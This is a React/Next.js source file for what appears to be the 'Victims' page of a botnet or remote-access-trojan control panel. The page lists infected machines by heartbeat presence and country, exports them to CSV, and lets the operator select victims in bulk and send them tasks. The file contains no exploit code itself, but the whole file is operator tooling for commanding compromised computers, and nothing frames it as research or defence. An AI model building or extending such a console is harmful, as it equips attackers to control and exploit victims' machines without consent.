'use client';
import { Suspense, useState } from 'react';
import { useSearchParams } from 'next/navigation';
import { Download, RefreshCw } from 'lucide-react';
import { useApi } from '@/hooks/useApi';
import { Topbar } from '@/components/topbar';
import { VictimFilters } from '@/components/victim-filters';
import { IgnoredChannels } from '@/components/ignored-channels';
import { VictimTable } from '@/components/victim-table';
import { TaskDialog } from '@/components/task-dialog';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { ErrorState, SkeletonRows } from '@/components/ui/table';
import type { Page, Victim } from '@/lib/types';

function VictimsInner() {
  const params = useSearchParams();
  const query = params.toString();
  const { data, loading, error, refresh } = useApi<Page<Victim>>(`/victims?${query}`, { pollMs: 15_000 });
  const [selected, setSelected] = useState<string[]>([]);
  const [dialog, setDialog] = useState(false);
  const items = data?.items ?? [];

  return (
    <>
      <Topbar title="Victims" subtitle="heartbeat-derived presence · 90s window" />
      <div className="pt-3">
        <Card className="overflow-hidden">
          <div className="flex items-center justify-between border-b border-line px-3 py-2">
            <div className="flex gap-1.5">
              <Button size="sm" variant="secondary" onClick={refresh}><RefreshCw className="h-3 w-3" /> refresh</Button>
              <Button size="sm" variant="secondary" onClick={() => window.open('/api/console/victims/export.csv?' + query, '_blank')}><Download className="h-3 w-3" /> CSV</Button>
            </div>
            <span className="font-mono text-2xs text-muted">{items.length} shown{data?.next ? ' · more available' : ''}</span>
          </div>
          <VictimFilters countries={Array.from(new Set(items.map((item) => item.country).filter(Boolean) as string[]))} />
          <IgnoredChannels onRelinked={refresh} />
          {error ? <ErrorState message={error.message} retry={refresh} /> : (
            <VictimTable items={items} loading={loading} selected={selected} onSelect={setSelected} onBulk={() => setDialog(true)} />
          )}
          {loading && items.length === 0 ? <SkeletonRows rows={10} /> : null}
        </Card>
      </div>
      <TaskDialog open={dialog} onOpenChange={setDialog} victimIds={selected} victims={items} />
    </>
  );
}

export default function VictimsPage() {
  return <Suspense fallback={<div className="p-4"><SkeletonRows rows={12} /></div>}><VictimsInner /></Suspense>;
}
